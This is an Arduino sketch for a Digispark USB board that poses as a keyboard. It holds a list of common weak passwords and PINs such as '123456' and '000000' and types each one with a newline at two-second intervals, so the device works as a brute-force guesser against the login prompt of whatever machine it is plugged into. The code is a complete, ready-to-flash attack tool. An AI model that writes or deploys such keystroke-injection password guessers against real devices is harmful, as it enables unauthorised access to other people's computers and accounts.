#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  // use tools/create-pwdlist-array.sh
char *pl[] = 
{
  "000000",
  "111111",
  "123123",
  "123321",
  "1234",
  "12345",
  "123456",
  "1234567",
  "12345678",
  ",mutauf]",  
  false
};



  int i;
  for(i = 0; pl[i]; i++)
  {
    DigiKeyboard.println(pl[i]);
    DigiKeyboard.delay(2000);
    //DigiKeyboard.sendKeyStroke(KEY_ENTER);
    //DigiKeyboard.delay(2000);
  }

  
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
  DigiKeyboard.println("loop ended");
  DigiKeyboard.delay(5000);
}
